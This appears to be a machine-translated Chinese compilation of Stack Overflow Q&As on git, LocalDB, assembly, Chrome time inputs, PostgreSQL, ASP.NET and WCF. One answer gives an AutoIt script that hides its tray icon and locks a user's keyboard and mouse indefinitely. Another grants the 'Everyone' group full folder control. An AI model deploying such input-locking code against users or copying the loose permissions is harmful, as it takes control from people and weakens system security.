## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T11:29:28.577

把它放在 viewDidLoad 有什么问题？

从它的外观来看，顺序是加载，动画然后出现的委托方法。还要把你的 sample=[[ViewControllerSample alloc]initWithNibName:@"ViewControllerSample" bundle:nil]; 在您的第二个视图控制器的 init 部分。

或者，您可以在动画之前调用 updateGUI。所以在 [UIView 转换之前...

```
[sc updateGUI]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T11:46:28.313

打个电话就行`updateGUI`了`viewDidLoad`。不要在`viewWillAppear`. `viewWillAppear`如果你让它做太多的工作，会阻止你的视图出现。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-09T11:33:20.993

答案分为两部分：

1.  加载视图时更新，但这只会发生一次，因此要重新使用控制器，我必须再次调用它。
2.  使用 isViewLoaded 查看视图是否已加载。如果是，则调用更新方法。

# git - 恢复/删除远程提交

> ID：13287250
> 
> 赞同：1
> 
> 时间：2012-11-08T10:33:06.093
> 
> 标签：git, github, git-extensions

我希望恢复最后 4 个远程提交并向后退 4 步，或者应该删除最后 4 个远程提交（由其他用户完成）。红线表示我的本地提交分支。有没有办法做到这一点？ ![在此处输入图像描述](../Images/b5e925601490ad2148d119a49f5ff5bb.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T11:48:47.810

有两种方法，首先您可以将提交保留在历史记录中，但不进行更改。这将允许克隆您的存储库的其他人继续工作，而不会严重破坏他们的引用。如果你没有充分的理由不这样做，这就是你应该做的。

你可以这样做，我将“坏”提交合并到你的主人，同时忽略他们的变化，只保留你的：

```
git merge -s ours origin/master 
```

如果您真的不想保留提交，您还可以使用以下`--force`参数覆盖远程分支：

```
git push origin master -f 
```

我没有在这台机器上安装 Git 扩展，所以我不能告诉你如何从 GUI 中执行第一个选项，但你可以通过从菜单中打开 Git Bash 来做到这一点。对于强制推送，您可以在推送对话框中的某处选中强制复选框。

# sql - 无法启动 LocalDB

> ID：13287252
> 
> 赞同：32
> 
> 时间：2012-11-08T10:33:16.817
> 
> 标签：sql, sql-server, sql-server-2012

无法启动 LocalDB 实例，我一遍又一遍地安装和重新安装。

不断收到此错误：

> 由于以下错误，LocalDB 实例“v11.0”启动失败：LocalDB 实例启动期间发生错误：SQL Server 进程无法启动。

任何人有什么建议吗？?

Microsoft SQL Server 2012，我确保了完整的安装选项，停止了所有与 SQL 相关的服务并尝试重新启动。

```
sqllocaldb info 
```

给我 ：

> 项目 v11.0

当我尝试

```
sqllocaldb start v11.0 
```

我收到上述错误。

* * *

## 回答 #1

> 赞同：55
> 
> 时间：2014-01-07T17:49:16.633

当所有其他方法都失败并且您不关心数据丢失时，请删除并重新创建您的 LocalDB\v11.0 数据库！在命令提示符处

```
sqllocaldb delete v11.0
sqllocaldb create v11.0 
```

（Sqllocaldb 在你的 PATH 中，对吗？它是给我的。）

* * *

## 回答 #2

> 赞同：27
> 
> 时间：2014-12-02T19:26:52.587

我遇到了类似的错误，但是在运行时

```
sqllocaldb start 
```

本地数据库启动成功。此外，在检查事件日志时，我看到了一个错误

> Windows API 调用 WaitForMultipleObjects 返回错误代码：575

什么为我解决了它：

1.  在 IIS 中，将应用程序池配置为在对服务器上的数据库具有权限的帐户下运行（应用程序池的高级选项）
2.  在应用程序池的高级选项中，将**Load User Profile**设置为**true**

参考：http: [//blogs.msdn.com/b/sqlexpress/archive/2011/12/09/using-localdb-with-full-iis-part-1-user-profile.aspx](http://blogs.msdn.com/b/sqlexpress/archive/2011/12/09/using-localdb-with-full-iis-part-1-user-profile.aspx)

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2015-05-18T08:56:29.310

也值得查看 LocalDB 日志文件，它比事件日志更详细：

```
%LocalAppData%\Microsoft\Microsoft SQL Server Local DB\Instances\ProjectsV12\error.log 
```

除了重新创建实例之外，我还必须删除此文件夹的内容：

```
%LocalAppData%\Microsoft\VisualStudio\SSDT\ 
```

这是我有 mdf 和 ldf 文件的地方。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2016-03-01T10:48:24.517

我的解决方案：

转到： `%LocalAppData%\Microsoft\Microsoft SQL Server Local DB\`并允许完全控制文件夹“Instances”进行`everyone`分组。

我知道这不好，但它解决了我的问题，我并不真正关心该文件夹的数据，因为这是一台正在开发和测试的计算机。

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2016-09-21T16:02:55.253

这里同样的问题。这是我使用此处发布的其他解决方案的一些修复它的方法。

我在应用程序事件日志中有很多这样的错误：

```
Windows API call WaitForMultipleObjects returned error code: 575\. Windows system error message is: {Application Error}
The application was unable to start correctly (0x%lx). Click OK to close the application.
Reported at line: 3730\. 
```

我意识到我的开发机器上安装了 SQL Server Management Studio，但没有安装其他 SQL 组件。我从 SQL Express 安装了数据库引擎、共享组件和 localdb

[https://www.microsoft.com/en-us/cloud-platform/sql-server-editions-express](https://www.microsoft.com/en-us/cloud-platform/sql-server-editions-express)

安装后，我仍然在事件日志中收到相同的错误:(

找到这篇文章： [无法启动 LocalDB](https://stackoverflow.com/questions/13287252/cannot-start-localdb)

在 cmd 中运行以下命令以获取 localdb 实例名称：C:> sqllocaldb info

在我的安装中，我有：MSSQLLocalDB ProjectsV13

我运行以下命令来删除实例：

```
sqllocaldb delete MSSQLLocalDB
sqllocaldb delete ProjectsV13 
```

我在尝试删除/创建这些（sqllocaldb delete MSSQLLocalDB）时遇到了问题。我最终删除了“%LocalAppData%\Microsoft\Microsoft SQL Server Local DB\Instances*”下的所有文件夹和文件（您需要停止 SQL Server 并终止所有 sqlserver 进程）

然后运行“sqllocaldb create”创建并启动默认实例和所有文件。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2020-08-07T08:31:02.277

也突然出现了这个问题，但在日志中没有看到任何奇怪的东西。能够通过**在管理员命令提示符**下运行以下命令来运行它：

```
sqllocaldb start 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2018-01-17T17:42:56.663

我有这个问题。我试图通过应用程序使用 Windows 身份验证，但 IIS 应用程序池凭据错误。我使用我的 Windows 用户名（即：）`NETWORK\name`作为我的身份，但我将其更改为内置的“ `LocalSystem`”并且它有效。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-11-08T11:29:27.880

您应该查看事件日志以获取更多信息。

> **产品名称**
> SQL Server
> 
> **产品版本** 11.0
> 
> 产品内部编号
> 
> **事件 ID**
> 266
> 
> **事件源**
> SQL Server 本地数据库运行时 11.0
> 
> **组件**
> 本地数据库运行时 API
> 
> **本地数据库实例启动期间发生消息文本**
> 错误：SQL Server 进程无法启动。
> 
> **说明** SQL Server 进程已启动，但 SQL Server 启动失败。
> 
> **用户操作** 有关详细信息，请参阅事件日志。

来源：http: [//msdn.microsoft.com/en-us/library/hh256140.aspx](http://msdn.microsoft.com/en-us/library/hh256140.aspx)

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2020-03-20T17:44:11.587

对我有用的是我使用的本地 IIS 应用程序池是 ApplicationPoolIdentity，它没有登录 MSSQLLocalDB 的权限。一旦我将应用程序池标识更改为我的 Windows 登录帐户 - 我就可以正常连接。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2020-07-31T04:15:45.160

当我们的应用程序在启用 Windows 8 兼容性的情况下运行时，在 Windows 10 上出现此问题。关闭兼容性设置修复它。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2020-11-27T13:34:32.250

在你尝试一些激烈的事情之前：

等待大约 5 分钟后，它自行“愈合”。

（可能这就是此日志消息所指向的内容：“RANU 实例正在终止以响应其内部超时”）

# assembly - 关于汇编语言条件选择

> ID：13287258
> 
> 赞同：-1
> 
> 时间：2012-11-08T10:33:30.420
> 
> 标签：assembly

我对c语言比较熟悉，但是我们如何将下面的c语言编码写成汇编语言呢？我试过但总是失败。

```
if(a==4)
{
   routine1();
}
else if(a==5)
{
    routine2();
}
else if(a==6)
{
    routine3();
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T14:19:46.140

一种可能性是使用 重写它`goto`，然后它应该直接移植到您使用的任何 asm 语言。

```
if (a != 4) goto not4;
routine1();
goto end;

not4: if (a != 5) goto not5;
routine2();
goto end;

not5: if (a != 6) goto not6;
routine3();
end: 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T15:07:25.020

在 x86 中，它会是这样的，还请查看链接以深入描述命令 [http://www.gabrielececchetti.it/Teaching/CalcolatoriElettronici/Docs/i8086_instruction_set.pdf](http://www.gabrielececchetti.it/Teaching/CalcolatoriElettronici/Docs/i8086_instruction_set.pdf)

```
a100 
mov al, 0500;move whats in memory location 0500 to al register
mov bl,4; mov 4 into bl register
cmp al,bl;this compares them basically subtracting them so 0 is equal
jz label1;the label is another memory location that you would jump to if they are equal
mov bl,5; if it doesnt jump then the code will continue to run
cmp al,bl
jz label2
mov bl,6
cmp al,bl
jz label3
int 3; to end program or you can use ret 
```

...

```
label1 call 0200;call instruction runs the code that is at the memory location stated
label2 call 0300
label3 call 0400 
```

希望这会有所帮助并记住这是 x86 ！编码快乐！！

# web-applications - Web App：如何禁用鼠标和键盘？

> ID：13287261
> 
> 赞同：0
> 
> 时间：2012-11-08T10:33:41.877
> 
> 标签：web-applications, keyboard, mouse

我的一个客户问我是否可以通过 web 应用程序完全禁用客户的键盘和鼠标。理想情况下在 jQuery 或 Html5 中。

我看到[了一种方法，](https://stackoverflow.com/questions/8595909/how-to-completley-disable-any-mouse-click)但只在网页上而不是整个键盘上。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-16T14:44:59.130

例如，使用[AutoIt3非常简单。](http://autoitscript.com)但是从 webapps 来说，阻止所有操作系统环境的鼠标和键盘是不可能的。

在 AutoIt3 中，这是一个示例：

```
; By default, AU3 add an tray icon for closing the app. No longer:
#NoTrayIcon
; For >=Vista, windows will require administrator privilleges to do that
#RequireAdmin
; Now...
BlockInput(1) ; mouse and keyboard are both lockeds!
While 1
   Sleep(100) ; loop for pause script
WEnd 
```

只需编译并运行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T10:45:41.507

你有没有尝试过类似的东西

```
$(document).ready(function () {
    $(document).bind("keypress", function (e) {
        // Prevent any key
        return false;
    });

    $(document).bind("click", function(e) {
        // Prevent clicks
        return false;
    });
}); 
```

它应该可以工作，但不确定它是否是跨浏览器。

还添加了`click`处理程序。

# windows-8 - Windows 商店应用程序上的 System.Runtime.Remoting.RemotingException

> ID：13287267
> 
> 赞同：9
> 
> 时间：2012-11-08T10:34:07.440
> 
> 标签：windows-8, visual-studio-2012, windows-store-apps

我是 Windows 8 商店应用程序开发的新手，我第一次安装这个 IDE 后遇到烦人的问题，一切正常，但是当我收到这个异常事件时，我的代码没有错误。我总是得到不同数量的异常，但消息是完全一样的。这是图片： ![图片1](../Images/c3b17a870c0605d95e372c8f5e7220a9.png)

![图 2](../Images/d949d35f4c5f9a23119ec1cfdc9a3361.png)

![图 3](../Images/4ab3f7e0a17ee3c41de5c1413254898b.png)

我该怎么做才能解决这个问题？我需要你的帮助，谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-08-17T23:17:22.497

更新到 VS 13 Update 3 后，我收到了同样的异常。这个解决方案对我有用：

转到`C:\Users\{user}\AppData\Local\Microsoft\VisualStudio\12.0\Designer\ShadowCache`并删除该文件夹中的所有内容。

来源：[https ://connect.microsoft.com/VisualStudio/feedback/details/797072/designer-crashes-in-visual-studio-2013-with-system-runtime-remoting-remotingexception](https://connect.microsoft.com/VisualStudio/feedback/details/797072/designer-crashes-in-visual-studio-2013-with-system-runtime-remoting-remotingexception)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T13:13:32.437

尝试以管理员身份运行 Blend。听起来有点像[这个问题](http://connect.microsoft.com/VisualStudio/feedback/details/728500/xaml-designer-in-metro-app-project-doesnt-come-up-unhandled-remotingexception)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-16T05:50:51.807

当我开始使用静态对象变量时，我遇到了同样的问题，其中对象从资源加载图像。不知何故，这绊倒了 Blend（也许使用静态变量的垃圾收集变得混乱）。

为了修复它，我只是将我的应用程序类中的静态对象变量作为非静态成员移动并通过公共访问器函数访问它。

更新 - 当我的一个 DependencyObject 实现导致堆栈溢出时，我也遇到了这个问题，当另一个属性发生变化时更新一个属性，反之亦然......寻找堆栈溢出。

希望这对某人有帮助！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-12-04T23:49:51.470

我有这个，现在。可重现的原因是我的代码触发的显示驱动程序崩溃。由于这可能只是显示驱动程序故障，它可能只需要在显示驱动程序中修复 - 同时您可以尝试找到导致显示驱动程序崩溃的位置并采取解决方法。但是无论您向它扔什么，显示驱动程序都不应该崩溃。我在您的屏幕截图中看到了奇怪的颜色和裂痕。所以我认为有些东西也会让你的 Display-Driver 崩溃。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-08T23:49:05.300

如果您正在构建 Windows 8 应用商店应用程序，请记住 System.Runtime.Remoting API 在 WinRT 中不可用。有关此处支持的所有 .NET API 的列表，请参阅 MSDN：http: [//msdn.microsoft.com/en-us/library/windows/apps/br230232.aspx](http://msdn.microsoft.com/en-us/library/windows/apps/br230232.aspx)。

尝试删除远程处理代码，看看是否能解决问题。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-08-21T21:10:04.567

I have been receiving the same error after updating Microsoft Visual Studio 2013 to Update 3

Designer works with a new project but removing the code in old projects does not work.

Deleting all folders in C:\Users{user}\AppData\Local\Microsoft\VisualStudio\12.0\Designer\ShadowCache worked for me...

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2015-03-07T23:45:31.643

@pcnThird 发布的解决方法不再有效。该问题已在 Update 1 中得到解决，随后在最新的 Visual Studio 2013 Update 3 中得到解决。

# wordpress - Twitter 工具仍显示旧用户名

> ID：13287268
> 
> 赞同：0
> 
> 时间：2012-11-08T10:34:13.207
> 
> 标签：wordpress, plugins, twitter

我最近更改了我的 twitter 帐户并想更改 WordPress 的 twitter 工具插件以在我的 WordPress 网站上显示帖子

我已经更改了帐户信息以匹配我在 Twitter 工具选项后端中的新 Twitter 帐户，它接受了它们并说它已连接。

但是 Tweets 现在不会加载我只是收到消息**Loading Tweets**。

当我在萤火虫上检查控制台中的页面时，我看到以下错误

**“NetworkError: 404 Not Found - [http://api.twitter.com/1/statuses/user_timeline.json?screen_name=oldusername&count=3&callback=json--id](http://api.twitter.com/1/statuses/user_timeline.json?screen_name=oldusername&count=3&callback=json--id)号-- ”**

网络错误中的用户名，而不是新用户名。

谁能告诉我我做错了什么？

提前谢谢了，

标记

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T12:31:05.480

设法解决了这个问题，有人在不同的文件中声明了用户名，覆盖了我在后端设置的用户名。

# google-chrome - 删除 Chrome input=time 中的秒数

> ID：13287269
> 
> 赞同：18
> 
> 时间：2012-11-08T10:34:19.220
> 
> 标签：google-chrome, time, input, webkit

在 Chrome 的最后一次更新中（在我的例子中是“23.0.1271.64 m”），现在 input=time 似乎包括不活动且不可点击的秒数。这在我们的网站上看起来不太好，所以我想知道是否有人找到了删除秒数的方法。不幸的是，jsfiddle 已关闭，我无法在此处发布示例，但我将其发布在这里，以便人们无论如何都可以阅读它。

```
<html>
<head></head>
<body>
    <input type="time" value="00:44" name="tiiiiden"/>
</body>
</html> 
```

由于秒只是“躺在那里”并且不可编辑，因此这可能是一个错误，很快就会修复。

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2015-03-09T12:02:06.667

我知道这是一个非常古老的问题，但我刚刚找到了解决方案。

您必须将步数更改为 60。如果您保留步数默认值 (1)，则必须增加一秒，因此必须在字段中显示秒数。

如果将步长设置为 60，则每次增加 1 分钟，因此不需要显示秒数。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2017-02-08T18:12:22.617

@hend 的设置`step`为 60 的解决方案适用于空输入，但如果您使用预先填充的值加载表单，您会发现秒数可能会以禁用状态重新出现。

[![在此处输入图像描述](../Images/1b0a12a76860ba52f9ba4e0052a73a8a.png)](https://i.stack.imgur.com/57I2s.png)

您可以使用以下 CSS 屏蔽它们和悬空的冒号：

```
 ::-webkit-datetime-edit-second-field {
    background: $color-white;
    color: transparent;
    margin-left: -3px;
    position: absolute;
    width: 1px;
  } 
```

产生以下结果：

[![在此处输入图像描述](../Images/3a1869633c29be7bdbe9574fe59f0eea.png)](https://i.stack.imgur.com/70VK5.png)

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-11-09T06:20:45.507

如果不需要，OSX 和 Linux 上的 Chrome 23 stable 会省略 seconds 字段，Windows 上的 Chrome 24 beta 也会省略它。我建议您等待 Chrome 24 稳定版本。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-11-08T20:27:05.807

我找不到与类型`23.0.1271.64 m`的任何更改相关的任何更改/发布说明，`form` `input`但根据W3C 的[HTML5 标记文档](http://dev.w3.org/html5/markup/)`input type="time"`的最新工作草案，该元素不支持任何其他时间格式，而不是“*定义的有效部分时间”在[RFC 3339](https://www.rfc-editor.org/rfc/rfc3339)*中”，即`hh:mm:ss.ff`和`hh:mm:ss`。

由于没有属性可以在任何一个日期/时间`input` [元素](http://dev.w3.org/html5/markup/elements.html#elements)上指定您自己的日期/时间格式，因此您无法使用定义的格式。

从[输入类型=时间-时间输入控制](http://dev.w3.org/html5/markup/input.time.html#input.time)

> **值：** [[RFC 3339]](https://www.rfc-editor.org/rfc/rfc3339)中定义的有效部分时间。
> **示例：**
> 23:20:50.52
> 17:39:57

来自[RFC 3339](https://www.rfc-editor.org/rfc/rfc3339)

> 时间-secfrac = "." 1*DIGIT
> 部分时间 = time-hour ":" time-minute ":" time-second [time-secfrac]

最后，我附上了如何`Chrome 23.0.1271.64 m`呈现不同时间格式的屏幕截图（在我的机器上）；

```
<input type="time" value="23:20:50.52" />
<input type="time" value="17:39:57" />
<input type="time" value="13:37" />
<input type="time" value="" /> 
```

![在此处输入图像描述](../Images/b48fa05b30392fb9ea76e804a60ae23a.png)

该标记也可在[jsFiddle 获得](http://jsfiddle.net/st3fan/ZGTUr/)。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-11-08T13:45:58.757

有同样的问题。我使用`white-space: nowrap`和`overflow: hidden`隐藏秒的固定宽度，但是当输入聚焦时，问题仍然存在。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2017-08-14T10:26:58.033

我有同样的问题，如果您使用预先填充的日期来填写您的输入，只需使用这个：

```
var myDate = new Date();
myDate.setSeconds(0);
myDate.setMilliseconds(0); 
```

使用这样的输入标签：

```
<input type="datetime-local" step="60"/> 
```

我个人使用角度，但任何东西都应该工作，因为 Date 是 Javascript。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2014-03-06T14:35:36.133

Android Chrome 和 Webbrowser 仍然存在这个问题，所以我使用 angularjs 做了一个特定于智能手机的解决方法：

[http://jsfiddle.net/Rvjuf/12/](http://jsfiddle.net/Rvjuf/12/)

这个怎么运作：

有 2 个元素可以处理这个问题：

```
<span>{{ timeDisplay }}</span>
<input type="time" ng-model="time"> 
```

在链接代码中，为元素设置样式（也可以在 CSS 文件中进行），并绑定到跨度的点击：

```
 scope.inputElement.css({
            position: "absolute",
            "z-index": "-10000",
            opacity: 0
        });
        scope.displayElement.css({
            width: "200px",
            height: "20px",
            background: "blue",
            color: "white",
        });
        scope.displayElement.bind("click", function(event) {
            scope.inputElement[0].focus();
            scope.inputElement[0].click();
        }); 
```

然后，为时间值注册一个更改侦听器并更新 timeDisplay 变量：

```
 $scope.$watch('time', function(nv, ov) {
            var parts = nv.split(" ")[0].split(":");
            var hours = parts[0];
            var minutes = parts[1];
            $scope.timeDisplay = $filter('date')(new Date(2014, 03, 06, hours, minutes, 0), "H:mm");
        }); 
```

因此，当用户点击跨度时，输入要么被聚焦，要么被点击（iOS 和 ANDROID 在那里有所不同），导致本地时间选择器 UI 出现。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2017-05-16T13:51:05.127

我们正在使用 moment.js 来解决这个问题。您可以通过在控制器上设置以下内容来舍入秒数以避免在预填充输入时间内出现 milis：

```
const localDate = moment(data.date).startOf('minute').toDate(); 
```

我希望它有帮助；）

# postgresql - regexp_matches 摆脱返回大括号的更好方法

> ID：13287274
> 
> 赞同：20
> 
> 时间：2012-11-08T10:34:35.070
> 
> 标签：postgresql

是否有更好的方法来修剪`{""}`regexp_matches 的结果而不是：

```
trim(trailing '"}' from trim(leading '{"' from regexp_matches(note, '[0-9a-z \r\n]+', 'i')::text)) 
```

* * *

## 回答 #1

> 赞同：43
> 
> 时间：2012-11-08T11:02:49.283

`regexp_matches()`返回所有匹配的数组。数组的字符串表示形式包含花括号，这就是你得到它们的原因。

如果您只想要所有匹配项的列表，可以使用`array_to_string()`将结果转换为“简单”文本数据类型：

```
array_to_string(regexp_matches(note, '[0-9a-z \r\n]+', 'i'), ';') 
```

如果你只对第一个匹配感兴趣，你可以选择数组的第一个元素：

```
(regexp_matches(note, '[0-9a-z \r\n]+', 'i'))[1] 
```

# c# - DataTable的数据

> ID：13287275
> 
> 赞同：3
> 
> 时间：2012-11-08T10:34:42.540
> 
> 标签：c#, asp.net, .net-4.0, data-connections

我有一个现成的库（dll）给我，其中包含重要数据，我能够将这些数据放入`Datatable`并成功显示在`GridView`.

现在我的进一步任务是它显示的数据`GridView`应该是可过滤的，这意味着如果我单击一行上的任何列，它应该过滤相似列的结果。

这是我的 GridView 结果

```
HeaderCol1        HeaderCol2       HeaderCol3      HeaderCol4 
Name1              Info1            ID1              Time1
Name2              Info2            ID2              Time2
Name1              Info3            ID3              Time3
Name3              Info2            ID4              Time4
Name4              Info4            ID3              Time5
Name5              Info5            ID5              Time5 
```

现在我想要的是如果我点击 Name1 它应该显示

```
HeaderCol1        HeaderCol2       HeaderCol3      HeaderCol4 
Name1              Info1            ID1              Time1
Name1              Info3            ID3              Time3 
```

如果我点击 Info2 它应该显示

```
HeaderCol1        HeaderCol2       HeaderCol3      HeaderCol4 
Name2              Info2            ID2              Time2
Name3              Info2            ID4              Time4 
```

我想我的问题现在很清楚了。我怎样才能做到这一点？提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T13:07:42.050

因此，您想`DataSource`通过用户单击的单元格的值来过滤 GridView。这些是一项多项任务，我将尝试解释所有任务。

主要任务是使每个单元格`GridView`对用户的点击做出反应，在服务器端处理该点击事件并以某种方式从该单元格获取值。

我`DataTable`在以下示例中使用了一个，将其替换为您的数据源类型。如果您需要将自定义事件/控件添加到`GridViewRows`最佳位置，`RowCreated`因为这会在每次回发时调用，而不仅仅是在数据绑定上。请注意，您`DataItem`在此阶段没有。

```
protected void gridView1_RowCreated(Object sender, GridViewRowEventArgs e)
{
    if (e.Row.RowType == DataControlRowType.DataRow)
    {
        for(int i = 0; i < e.Row.Cells.Count; i++)
        {
            TableCell cell = e.Row.Cells[i];
            cell.ToolTip = "Click to filter by this value";
            string js = string.Format("var txt=document.getElementById('{0}');txt.value='{1} {2}';{3}"
                , TxtFilter.ClientID, e.Row.RowIndex, i
                , ClientScript.GetPostBackClientHyperlink(TxtFilter, null));
            cell.Attributes["onclick"] = js;
        }
    }
} 
```

如您所见，我已将客户端`onclick`事件添加到每个单元格。我正在使用隐藏的`TextBox`（显示：无）`AutoPostBack=true`来存储用户单击的行和单元格。现在您可以在服务器端处理和处理 click 事件。

```
protected void FilterGrid(object sender, EventArgs e)
{
    TextBox txtFilter = (TextBox)sender;
    string[] parts = txtFilter.Text.Split();
    int row = int.Parse(parts[0]);
    int col = int.Parse(parts[1]);
    gridView1.DataSource = GetData(row, col);
    gridView1.DataBind();
}

// replace with your DAL, used a DataTable for testing
private DataTable GetData(int rowIndex = -1, int colIndex = -1)
{
    DataTable tblData = getDataSource(); 
    if (rowIndex > -1 && colIndex > -1)
    {
        var field = tblData.Columns[colIndex];
        var row = tblData.Rows[rowIndex];
        var value = row[field];
        // now use Linq-To-DataSet to filter the table, remember to add 'using System.Linq'
        tblData = tblData.AsEnumerable()
            .Where(r => !r.IsNull(field) && r[field].Equals(value))
            .CopyToDataTable();
    }

    return tblData;
} 
```

这是我的示例页面的 aspx：

```
<asp:TextBox ID="TxtFilter" runat="server" style="display:none" AutoPostBack="true" OnTextChanged="FilterGrid" />
<asp:GridView ID="gridView1" runat="server" AutoGenerateColumns="False" OnRowCreated="gridView1_RowCreated"  >
   <Columns>
       <asp:TemplateField HeaderText="HeaderCol1">
            <ItemTemplate>
                <asp:Label ID="LblHeaderCol1" runat="server" Text='<%#Eval("HeaderCol1") %>' />
            </ItemTemplate>
       </asp:TemplateField>
       <asp:TemplateField HeaderText="HeaderCol2">
            <ItemTemplate>
                <asp:Label ID="LblHeaderCol2" runat="server" Text='<%#Eval("HeaderCol2") %>' />
            </ItemTemplate>
       </asp:TemplateField>
       <asp:TemplateField HeaderText="HeaderCol3">
            <ItemTemplate>
                <asp:Label ID="LblHeaderCol3" runat="server" Text='<%#Eval("HeaderCol3") %>' />
            </ItemTemplate>
       </asp:TemplateField>
       <asp:TemplateField HeaderText="HeaderCol4">
            <ItemTemplate>
                <asp:Label ID="LblHeaderCol4" runat="server" Text='<%#Eval("HeaderCol4") %>' />
            </ItemTemplate>
       </asp:TemplateField>
  </Columns>
</asp:GridView> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T12:35:59.080

1) 创建显示人员详细信息的新页面（.aspx 文件）等。

2）在您当前`GridView`，您必须使用[`HyperLinkField`](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.hyperlinkfield.aspx)而不是简单`BoundField`：

```
 <asp:hyperlinkfield datatextfield="UnitPrice"
        datatextformatstring="{0:c}"
        datanavigateurlfields="ProductID"
        datanavigateurlformatstring="~\yourNewPage.aspx?ProductID={0}"          
        headertext="HeaderCol1"
        target="_blank" /> 
```

现在，这将呈现一个超链接，单击该超链接将在新页面中打开详细信息。

# javascript - 来自推荐人的正则表达式 JS

> ID：13287277
> 
> 赞同：1
> 
> 时间：2012-11-08T10:34:44.213
> 
> 标签：javascript

我需要检查推荐人是否有单词“profile”，我需要将 profile/(.*?) 放在 var 中。我怎么能在js中做到这一点？

```
<script type="text/javascript">
var ref = document.referrer;
if( ~ref.indexOf("profile") ) {
  alert('coincidence found!');
}

 </script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T12:03:10.800

```
<script>
var str="Is this all there is?";
var patt1=/[^a-h]/g;
document.write(str.match(patt1));
</script> 
```

结果：I,s, ,t,i,s, ,l,l, ,t,r, ,i,s,?

检查[链接 [^abc] 表达式用于查找不在括号内的任何字符。](http://www.w3schools.com/jsref/jsref_regexp_charset_not.asp)

这也是[链接](http://www.w3schools.com/jsref/jsref_obj_regexp.asp)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-05-30T09:26:57.547

```
var ref = document.referrer;
ref.match(/(?:profile).+/,(match)=> {
    console.log(match)
}) 
```

# xpages - xpages 属性文件与下拉列表的管理菜单

> ID：13287281
> 
> 赞同：0
> 
> 时间：2012-11-08T10:34:55.390
> 
> 标签：xpages

对于XPages 应用程序，填充**下拉**列表的最佳做法是什么：

1.  在管理菜单中管理并使用**@DbColumn/@DbLookup显示的列表项**
2.  存储在属性文件中并使用 SSJS 检索的列表项

为了获得更好的性能，这可能是以下情况的首选解决方案：

1.  n. 列表项<10
2.  n. 列表项<100
3.  n. 列表项<1000
4.  n. 列表项<10000

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-08T11:38:11.883

既不也不！一个非常聪明的方法是让一个（或两个）bean 包含您最终要寻找的所有属性。如果那是全局值，那么 applicationScope 就是正确的地方。对于用户特定的，它是 sessionScope。在 XPage 中您的值填充将很容易：（`AppSetup.departments`即 EL 代码，而不是 SSJS！）其中**AppSetup**是托管 bean 名称，**部门**转换为 .getDepartments()；

您可以从 bean 内部的简单查找开始，然后添加您认为合适的缓存和备用存储（例如 MIMEDoc）。由于您的“合同”是公共方法，您可以根据自己的内心需求进行内部优化。

这是[缓存查找](http://www.wissel.net/blog/d6plinks/SHWL-8DFBNZ)的 SSJS 版本，但您想要使用 bean，因为它允许您使用 EL，这增加了一点额外的速度。

一句话：你知道每次下拉列表有超过 100 个条目时，一只小猫就必须死掉。所以不适合 UX。对于较大的值，请使用具有搜索功能或其他 UX 元素的网格。

# c# - WCF 堆栈中使用 BasicHttpBinding、http 标头和肥皂信封的数据包碎片总是按数据包边界分割？

> ID：13287283
> 
> 赞同：4
> 
> 时间：2012-11-08T10:35:00.527
> 
> 标签：c#, wcf, httpwebrequest, basichttpbinding

我有一个问题，我有很多非常小的 Web 服务调用到 Java 端点（托管在 Oracle GlassFish 3.1.X 上）。我将此服务添加为服务引用（使用远程 wsdl 文件）并使用 BasicHttpBinding 来访问它。

由于该服务位于半个地球之外，而且还要通过互联网，所以我们在到达目的地时经常会遇到一些丢包现象。我们正在寻找任何可能的方法来减少这些事件的影响。我们一直在使用 Wireshark 为我们提供有关通过电线到达目的地并再次返回的详细信息。我很好奇地看到，对于我们生成的每个请求，我们都会发送 2 个数据包。数据包边界始终位于 HTTP 标头和`<s:Envelope>`标记之间。对我来说，这是一个很大的开销，特别是在我想要最小化发送的数据包数量（以减少整体数据包丢失）的环境中。

在大多数情况下（我们调用的 99%），HTTP 标头数据包是 210 字节，然后是 291 字节的 SOAP 信封数据包（不包括每个数据包的 54 字节 TCP/IP 开销）。将这些加起来有 501 个字节——刚好超过我们最大段大小 1460 字节的三分之一。为什么 WCF 不将此 HTTP POST 请求作为 501 字节的单个数据包发送（如果包括 54 字节的 TCP/IP 开销，则为 555 字节）？

